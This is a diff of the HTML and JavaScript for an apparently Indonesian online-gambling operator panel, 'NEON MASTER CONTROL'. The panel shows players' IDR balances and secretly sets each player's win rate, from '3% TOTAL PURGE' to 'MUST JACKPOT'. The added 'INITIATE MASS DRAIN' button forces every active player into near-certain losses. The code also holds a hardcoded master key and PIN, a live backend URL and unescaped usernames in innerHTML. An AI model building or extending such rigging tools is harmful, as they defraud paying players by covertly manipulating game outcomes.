@@ -3,286 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEON MASTER CONTROL - V3.5 ULTIMATE LIVE</title>
+    <title>NEON MASTER CONTROL - V4.0 ULTIMATE</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <style>
         :root { 
             --pink: #ff0077; --blue: #00d4ff; --yellow: #fbff00; 
-            --bg: #05060f; --green: #00ff88; --orange: #ff8800;
+            --bg: #05060f; --green: #00ff88; --orange: #ff8800; --red: #ff0000;
+            --neon-pink: 0 0 15px var(--pink);
+            --neon-blue: 0 0 15px var(--blue);
+            --neon-yellow: 0 0 15px var(--yellow);
+            --neon-red: 0 0 20px var(--red);
         }
 
         body { 
             background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; 
             padding: 20px; margin: 0; overflow-x: hidden;
         }
+
+        /* Scanline Effect */
+        body::before {
+            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 9999; background-size: 100% 2px, 3px 100%; pointer-events: none;
+        }
         
+        /* Header */
         .header { 
             text-align: center; padding: 20px; border: 2px solid var(--blue); 
-            box-shadow: 0 0 15px var(--blue), inset 0 0 5px var(--blue); 
+            box-shadow: var(--neon-blue), inset var(--neon-blue); 
             border-radius: 15px; background: rgba(0, 212, 255, 0.05); margin-bottom: 20px; 
         }
-        .header h2 { margin: 0; color: var(--pink); text-shadow: 0 0 15px var(--pink); text-transform: uppercase; letter-spacing: 2px; }
+        .header h2 { margin: 0; color: var(--pink); text-shadow: var(--neon-pink); text-transform: uppercase; letter-spacing: 3px; }
 
-        .live-tag { font-size: 10px; color: var(--green); animation: blink 1s infinite; font-weight: bold; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        
-        .admin-tools { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-        .btn-tool { 
-            background: rgba(0,0,0,0.5); border: 1px solid; padding: 12px; 
-            border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; text-transform: uppercase;
+        /* Panic Area Neon */
+        .panic-container {
+            background: rgba(255, 0, 0, 0.05); border: 2px dashed var(--red);
+            padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 20px;
+            box-shadow: inset 0 0 10px var(--red);
         }
-        .btn-sync { border-color: var(--blue); color: var(--blue); }
-        .btn-broadcast { border-color: var(--yellow); color: var(--yellow); }
 
+        .btn-panic {
+            background: transparent; color: var(--red); border: 2px solid var(--red);
+            padding: 15px 40px; border-radius: 10px; font-weight: 900; font-size: 18px;
+            cursor: pointer; box-shadow: var(--neon-red); text-transform: uppercase;
+            transition: 0.3s; animation: pulse-red 1.5s infinite;
+        }
+        .btn-panic:hover { background: var(--red); color: white; }
+
+        @keyframes pulse-red { 0% { opacity: 1; } 50% { opacity: 0.5; box-shadow: 0 0 40px var(--red); } 100% { opacity: 1; } }
+
+        /* User Box Neon */
         .user-box { 
-            background: rgba(255,255,255,0.03); border: 1px solid rgba(0, 212, 255, 0.2); 
-            padding: 15px; margin-top: 10px; border-radius: 12px; transition: 0.4s;
+            background: rgba(0, 0, 0, 0.8); border: 1px solid var(--blue); 
+            padding: 18px; margin-top: 15px; border-radius: 12px; transition: 0.4s;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.1);
         }
-        .user-info { display: flex; justify-content: space-between; align-items: center; }
-        .username { color: var(--blue); font-size: 16px; font-weight: bold; text-shadow: 0 0 5px var(--blue); }
-        .status-badge { font-size: 9px; padding: 2px 6px; border-radius: 4px; background: #333; margin-left: 5px; font-weight: bold; }
+        .user-box:hover { box-shadow: var(--neon-blue); transform: translateY(-2px); }
+
+        .username { color: var(--yellow); font-size: 18px; font-weight: bold; text-shadow: var(--neon-yellow); }
+        .balance-val { font-weight: bold; font-size: 19px; color: var(--green); text-shadow: 0 0 10px var(--green); }
+
+        /* Controls Grid */
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
         
-        /* State Status Online */
-        .status-online { color: var(--green); border: 1px solid var(--green); box-shadow: 0 0 5px var(--green); }
-        .status-offline { color: #888; border: 1px solid #444; }
+        .select-strategy {
+            background: #000; color: var(--blue); border: 1px solid var(--blue);
+            padding: 12px; border-radius: 8px; font-size: 12px; font-weight: bold;
+            grid-column: span 2; width: 100%; cursor: pointer; outline: none;
+            box-shadow: inset 0 0 5px var(--blue);
+        }
 
-        .balance-val { font-weight: bold; font-size: 17px; transition: 0.3s; }
-        .up { color: var(--green); text-shadow: 0 0 10px var(--green); }
-        .down { color: var(--pink); text-shadow: 0 0 10px var(--pink); }
-        .normal { color: var(--yellow); }
-        .error-balance { color: #ff0000; text-shadow: 0 0 10px #ff0000; animation: blink 0.5s infinite; }
-
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px; }
-        select, .btn-action { 
-            background: #000; color: white; border: 1px solid #444; 
-            padding: 10px; border-radius: 6px; font-size: 10px; cursor: pointer; width: 100%;
+        .btn-action { 
+            background: rgba(0,0,0,0.6); color: white; border: 1px solid #fff; 
+            padding: 10px; border-radius: 8px; font-size: 11px; font-weight: bold; 
+            cursor: pointer; text-transform: uppercase; transition: 0.2s;
         }
         .btn-inject { border-color: var(--green); color: var(--green); }
+        .btn-inject:hover { background: var(--green); color: black; box-shadow: 0 0 15px var(--green); }
         .btn-maxwin { border-color: var(--pink); color: var(--pink); }
-        .btn-freeze { border-color: var(--orange); color: var(--orange); }
+        .btn-maxwin:hover { background: var(--pink); color: white; box-shadow: var(--neon-pink); }
 
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 999; backdrop-filter: blur(8px); }
+        /* Neon Modals */
+        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 999; backdrop-filter: blur(10px); }
+        
         .neon-modal { 
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            width: 85%; max-width: 350px; background: #0a0b1a; border: 2px solid var(--yellow); 
-            box-shadow: 0 0 30px var(--yellow); border-radius: 20px; padding: 25px; z-index: 1000; text-align: center;
+            width: 85%; max-width: 380px; background: #05060f; border: 2px solid var(--blue); 
+            box-shadow: var(--neon-blue); border-radius: 20px; padding: 30px; z-index: 1000; text-align: center;
         }
-        .neon-modal input { width: 90%; background: #000; border: 1px solid var(--blue); padding: 12px; color: white; border-radius: 8px; margin: 10px 0; text-align: center; outline: none; }
-        .btn-confirm { background: var(--pink); border: none; color: white; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .btn-cancel { background: #333; border: none; color: white; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .neon-modal h2, .neon-modal h3 { margin-top: 0; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .neon-modal input { 
+            width: 90%; background: #000; border: 1px solid var(--yellow); padding: 12px; 
+            color: var(--yellow); border-radius: 8px; margin: 15px 0; text-align: center; 
+            outline: none; box-shadow: inset 0 0 5px var(--yellow); font-weight: bold;
+        }
 
-        #toast { visibility: hidden; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--blue); color: black; padding: 12px 25px; border-radius: 10px; font-weight: bold; z-index: 2000; }
+        /* Toast Neon */
+        #toast { 
+            visibility: hidden; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); 
+            background: #000; color: var(--green); border: 2px solid var(--green);
+            padding: 15px 30px; border-radius: 50px; font-weight: bold; z-index: 2000;
+            box-shadow: 0 0 20px var(--green); text-transform: uppercase;
+        }
         #toast.show { visibility: visible; animation: fadeInOut 2.5s; }
         @keyframes fadeInOut { 0%, 100% { opacity: 0; bottom: 0; } 15%, 85% { opacity: 1; bottom: 30px; } }
+
+        .btn-confirm-neon { background: var(--blue); color: black; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; box-shadow: var(--neon-blue); }
+        .btn-cancel-neon { background: transparent; color: #666; border: 1px solid #666; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <audio id="snd-click" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
-    <audio id="snd-success" src="https://www.soundjay.com/buttons/sounds/button-09.mp3"></audio>
+    <audio id="snd-panic" src="https://www.soundjay.com/buttons/sounds/alarm-clock-01.mp3"></audio>
 
-    <div class="overlay" id="login-overlay" style="display: block;"></div>
-    <div class="neon-modal" id="login-modal" style="display: block; border-color: var(--pink);">
-        <h3>MASTER ACCESS</h3>
-        <input type="password" id="pin-input" placeholder="ENTER MASTER PIN">
-        <button class="btn-confirm" onclick="verifyPin()">UNLOCK SYSTEM</button>
+    <div id="main-ui">
+        <div class="panic-container">
+            <h3 style="color:var(--red); margin-top:0; font-size:13px; text-shadow: var(--neon-red);">
+                <i class="fas fa-radiation"></i> MASTER OVERRIDE SYSTEM
+            </h3>
+            <button class="btn-panic" onclick="triggerPanic()">INITIATE MASS DRAIN</button>
+            <p style="font-size:10px; color:#888; margin-top:10px; letter-spacing: 1px;">FORCE WINRATE 3% TO ALL ACTIVE SESSIONS</p>
+        </div>
+
+        <div class="header">
+            <h2>MASTER LIVE PANEL</h2>
+            <div id="clock" style="font-size:12px; color:var(--yellow); text-shadow: var(--neon-yellow); font-weight: bold;"></div>
+        </div>
+
+        <div id="display-area">
+            </div>
     </div>
 
-    <div id="main-ui" style="display: none;">
-        <div class="header">
-            <h2>MASTER PANEL <span class="live-tag">• LIVE MONITORING</span></h2>
-            <p id="clock" style="font-size:10px; color:var(--yellow); font-weight:bold;"></p>
+    <div class="overlay" id="panic-overlay"></div>
+    <div class="neon-modal" id="panic-modal" style="border-color:var(--red); box-shadow: var(--neon-red);">
+        <h2 style="color:var(--red); text-shadow: var(--neon-red);">CONFIRM PURGE?</h2>
+        <p style="font-size:13px; color: #ccc;">Sistem akan memaksa seluruh pemain masuk ke mode kekalahan telak.</p>
+        <div style="display:flex; gap:15px; justify-content:center; margin-top:25px;">
+            <button onclick="executePanic()" class="btn-confirm-neon" style="background:var(--red); color:white; box-shadow: var(--neon-red);">EXECUTE</button>
+            <button onclick="closePanic()" class="btn-cancel-neon">ABORT</button>
         </div>
-        <div class="admin-tools">
-            <button class="btn-tool btn-sync" onclick="fetchData()"><i class="fas fa-sync"></i> Force Sync</button>
-            <button class="btn-tool btn-broadcast" onclick="openBroadcast()"><i class="fas fa-bullhorn"></i> Broadcast</button>
-        </div>
-        <div id="display-area"></div>
     </div>
 
     <div class="overlay" id="common-overlay"></div>
     <div class="neon-modal" id="common-modal">
-        <h3 id="modal-title">TITLE</h3>
-        <p id="modal-desc" style="font-size: 12px; color: #bbb;"></p>
-        <input type="text" id="modal-input" style="display: none;">
-        <div class="btn-group" style="display:flex; gap:10px; justify-content:center; margin-top:15px;">
-            <button class="btn-confirm" id="modal-ok-btn">CONFIRM</button>
-            <button class="btn-cancel" onclick="closeModal()">CANCEL</button>
+        <h3 id="modal-title" style="color:var(--blue); text-shadow: var(--neon-blue);">TITLE</h3>
+        <p id="modal-desc" style="font-size: 13px; color: #888;"></p>
+        <input type="text" id="modal-input" placeholder="ENTER VALUE...">
+        <div style="display:flex; gap:10px; justify-content:center; margin-top:15px;">
+            <button id="modal-ok-btn" class="btn-confirm-neon">CONFIRM</button>
+            <button onclick="closeModal()" class="btn-cancel-neon">CANCEL</button>
         </div>
     </div>
 
-    <div id="toast">SUCCESS</div>
+    <div id="toast">SYSTEM NOTIFIED</div>
 
     <script>
-        const API_URL = "https://script.google.com/macros/s/AKfycbzYTC11njbEBtAsdpbaRLJRt13j7iEKCkANV1SgxxguV_zFUyZ6Z7FAj0SKuw4d5ThmKw/exec";
-        const MASTER_PIN = "2026";
-        let lastBalances = {}; 
-        let isUpdating = false; 
-        
-        // Clock
+        const API_URL = "ISI_URL_APPS_SCRIPT_ANDA"; 
+        let isUpdating = false;
+
+        function renderUsers(users) {
+            const area = document.getElementById('display-area');
+            area.innerHTML = ''; 
+            users.forEach(u => {
+                const isOnline = u.status.toLowerCase() === 'online' || u.status.toLowerCase() === 'active';
+                const div = document.createElement('div');
+                div.className = 'user-box';
+                div.innerHTML = `
+                    <div class="user-info">
+                        <div>
+                            <span class="username">${u.username.toUpperCase()}</span>
+                            <div style="font-size:10px; color:${isOnline ? 'var(--green)' : '#444'}; font-weight:bold; margin-top:5px;">
+                                <i class="fas fa-circle"></i> ${u.status.toUpperCase()}
+                            </div>
+                        </div>
+                        <div class="balance-val">IDR ${Number(u.saldo).toLocaleString()}</div>
+                    </div>
+                    <div class="controls">
+                        <select class="select-strategy" onchange="updateWR('${u.username}', this.value)">
+                            <option value="">-- CURRENT RATE: ${u.winrate}% --</option>
+                            <optgroup label="🔴 DRAIN MODE">
+                                <option value="3" ${u.winrate <= 5 ? 'selected' : ''}>3% - TOTAL PURGE</option>
+                                <option value="25" ${u.winrate == 25 ? 'selected' : ''}>25% - MEDIUM DRAIN</option>
+                            </optgroup>
+                            <optgroup label="🔵 OPERATIONAL">
+                                <option value="50" ${u.winrate == 50 ? 'selected' : ''}>50% - FAIR GAME</option>
+                                <option value="80" ${u.winrate == 80 ? 'selected' : ''}>80% - HIGH CHANCE</option>
+                            </optgroup>
+                            <optgroup label="🟡 PROFIT MODE">
+                                <option value="100" ${u.winrate == 100 ? 'selected' : ''}>100% - MUST JACKPOT</option>
+                            </optgroup>
+                        </select>
+                        <button class="btn-action btn-inject" onclick="prepareInject('${u.username}')">CREDIT</button>
+                        <button class="btn-action btn-maxwin" onclick="prepareMaxwin('${u.username}')">MAX LIMIT</button>
+                    </div>
+                `;
+                area.appendChild(div);
+            });
+        }
+
+        // Functions Logic
+        function triggerPanic() {
+            document.getElementById('panic-overlay').style.display = 'block';
+            document.getElementById('panic-modal').style.display = 'block';
+            document.getElementById('snd-panic').play().catch(e=>{});
+        }
+
+        function closePanic() {
+            document.getElementById('panic-overlay').style.display = 'none';
+            document.getElementById('panic-modal').style.display = 'none';
+        }
+
+        async function executePanic() {
+            closePanic();
+            showToast("⚠️ INITIATING GLOBAL DRAIN...");
+            try {
+                const res = await fetch(API_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({ action: "panicDrainAll", key: "MASTER2026" })
+                });
+                showToast("✅ ALL USERS PURGED TO 3%");
+                fetchData();
+            } catch(e) { showToast("❌ FAILED TO EXECUTE"); }
+        }
+
+        function showModal(title, desc, cb) {
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-desc').innerText = desc;
+            document.getElementById('common-overlay').style.display = 'block';
+            document.getElementById('common-modal').style.display = 'block';
+            document.getElementById('modal-ok-btn').onclick = () => {
+                cb(document.getElementById('modal-input').value);
+                closeModal();
+            };
+        }
+
+        function closeModal() {
+            document.getElementById('common-overlay').style.display = 'none';
+            document.getElementById('common-modal').style.display = 'none';
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
+
         setInterval(() => { 
             document.getElementById('clock').innerText = new Date().toLocaleString('id-ID'); 
         }, 1000);
 
-        function playSnd(id) { document.getElementById(id).play().catch(e=>{}); }
-
-        function verifyPin() {
-            if(document.getElementById('pin-input').value === MASTER_PIN) {
-                playSnd('snd-success');
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('login-modal').style.display = 'none';
-                document.getElementById('main-ui').style.display = 'block';
-                startLiveMonitoring();
-            } else { alert("ACCESS DENIED"); }
-        }
-
-        function startLiveMonitoring() {
-            fetchData();
-            setInterval(fetchData, 3000); 
-        }
-
-        async function fetchData() {
-            if (isUpdating) return; 
-            try {
-                const res = await fetch(API_URL, { method: 'POST', body: JSON.stringify({ action: "getAllUsers" }) });
-                const users = await res.json();
-                renderUsers(users);
-            } catch(e) { console.log("Sync error..."); }
-        }
-
-        function renderUsers(users) {
-            const area = document.getElementById('display-area');
-            users.forEach(u => {
-                let userDiv = document.getElementById(`user-${u.username}`);
-                const currentSaldo = Number(u.saldo);
-                const oldSaldo = lastBalances[u.username] || currentSaldo;
-                
-                // Deteksi Pergerakan Saldo
-                let balanceClass = "normal";
-                let trendIcon = "";
-                if (currentSaldo > oldSaldo) { balanceClass = "up"; trendIcon = "↑ "; }
-                else if (currentSaldo < oldSaldo) { balanceClass = "down"; trendIcon = "↓ "; }
-                
-                lastBalances[u.username] = currentSaldo;
-
-                if (!userDiv) {
-                    userDiv = document.createElement('div');
-                    userDiv.id = `user-${u.username}`;
-                    userDiv.className = 'user-box';
-                    area.appendChild(userDiv);
-                }
-
-                // Logic Tampilan Saldo Minus & Status Online
-                const displaySaldo = currentSaldo < 0 
-                    ? `<span class="error-balance">ERR: ${currentSaldo.toLocaleString()}</span>` 
-                    : `IDR ${currentSaldo.toLocaleString()}`;
-                
-                const isOnline = u.status.toLowerCase() === 'online' || u.status.toLowerCase() === 'active';
-                const statusClass = isOnline ? 'status-online' : 'status-offline';
-
-                userDiv.innerHTML = `
-                    <div class="user-info">
-                        <div>
-                            <span class="username">${u.username.toUpperCase()}</span>
-                            <span class="status-badge ${statusClass}">${u.status.toUpperCase()}</span>
-                            <div style="font-size:9px; color:#888; margin-top:4px;">
-                                WR: ${u.winrate}% | Max: ${u.maxwinlimit || '50k'}
-                            </div>
-                        </div>
-                        <div class="balance-val ${balanceClass}">${trendIcon}${displaySaldo}</div>
-                    </div>
-                    <div class="controls">
-                        <button class="btn-action btn-inject" onclick="prepareInject('${u.username}')">± CREDIT</button>
-                        <button class="btn-action btn-maxwin" onclick="prepareMaxwin('${u.username}')">MAXWIN LIMIT</button>
-                        <button class="btn-action btn-freeze" onclick="toggleFreeze('${u.username}', '${u.status}')">
-                            ${isOnline ? 'FREEZE' : 'UNFREEZE'}
-                        </button>
-                        <select class="btn-winrate" onchange="updateWR('${u.username}', this.value)" ${isUpdating ? 'disabled' : ''}>
-                            <option value="">SET RATE</option>
-                            <option value="100" ${u.winrate == 100 ? 'selected' : ''}>100% JP</option>
-                            <option value="50" ${u.winrate == 50 ? 'selected' : ''}>NORMAL</option>
-                            <option value="3" ${u.winrate <= 5 ? 'selected' : ''}>DRAIN (3%)</option>
-                        </select>
-                    </div>
-                `;
-            });
-        }
-
-        // Action Handlers
-        async function executeAction(action, user, data) {
-            isUpdating = true; 
-            showToast("PROCESSING COMMAND...");
-            try {
-                const res = await fetch(API_URL, { 
-                    method: 'POST', 
-                    body: JSON.stringify({ action, targetUser: user, ...data })
-                });
-                const result = await res.json();
-                if(result.result === "SUCCESS") { 
-                    playSnd('snd-success'); 
-                    showToast("SYSTEM UPDATED!"); 
-                    setTimeout(() => { isUpdating = false; fetchData(); }, 1200);
-                }
-            } catch(e) { 
-                showToast("FAILED!"); 
-                isUpdating = false; 
-            }
-        }
-
-        function prepareInject(user) {
-            showModal("INJECT CREDIT", `Tambah/Kurang saldo ${user}:`, true, (val) => {
-                if(val) executeAction("adminUpdateSaldo", user, { amount: val });
-            });
-        }
-
-        function prepareMaxwin(user) {
-            showModal("MAXWIN LIMIT", `Atur batas kemenangan ${user}:`, true, (val) => {
-                if(val) executeAction("setMaxwinLimit", user, { maxwin: val });
-            });
-        }
-
-        function toggleFreeze(user, currentStatus) {
-            const isOnline = currentStatus.toLowerCase() === 'online' || currentStatus.toLowerCase() === 'active';
-            const nextStatus = isOnline ? 'frozen' : 'active';
-            showModal("STATUS CONTROL", `${nextStatus.toUpperCase()} akun ${user}?`, false, () => {
-                executeAction("updateStatus", user, { status: nextStatus });
-            });
-        }
-
-        function updateWR(user, rate) {
-            if(!rate) return;
-            executeAction("updateWinrate", user, { newRate: rate });
-        }
-
-        function openBroadcast() {
-            showModal("BROADCAST", "Kirim pesan global ke semua user:", true, (msg) => {
-                if(msg) showToast("BROADCAST SENT!");
-            });
-        }
-
-        // UI Helpers
-        function showModal(title, desc, useInput, cb) {
-            document.getElementById('modal-title').innerText = title;
-            document.getElementById('modal-desc').innerText = desc;
-            const input = document.getElementById('modal-input');
-            input.style.display = useInput ? "block" : "none";
-            input.value = "";
-            document.getElementById('common-overlay').style.display = "block";
-            document.getElementById('common-modal').style.display = "block";
-            document.getElementById('modal-ok-btn').onclick = () => { cb(input.value); closeModal(); };
-        }
-
-        function closeModal() {
-            document.getElementById('common-overlay').style.display = "none";
-            document.getElementById('common-modal').style.display = "none";
-        }
-
-        function showToast(msg) {
-            const t = document.getElementById('toast'); 
-            t.innerText = msg; 
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 2500);
-        }
+        window.onload = () => { /* fetchData(); */ };
     </script>
 </body>
 </html>
